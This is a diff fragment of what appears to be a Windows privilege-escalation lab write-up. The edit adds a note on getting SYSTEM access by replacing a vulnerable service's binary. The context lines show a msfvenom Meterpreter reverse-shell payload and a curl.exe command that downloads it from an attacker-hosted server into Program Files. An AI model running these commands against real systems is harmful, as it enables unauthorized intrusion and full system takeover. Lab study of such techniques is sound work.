@@ -370,7 +370,9 @@ On Kali I create the payload ```msfvenom -p windows/meterpreter/reverse_tcp LHOS
 
 Then on Windows ```curl.exe http://192.168.199.129:8000/Vulnerable.exe -o "C:\Program Files\Vulnerable Service\Vulnerable.exe"```
 
+Our payload is now planted and awaiting a reboot in order to start. For our purposes I manually trigger it. This then gives us SYSTEM access.
 
+https://youtu.be/60mYlV3cPIs
 
 DLL Hijacking - DLLHijackSvc
 
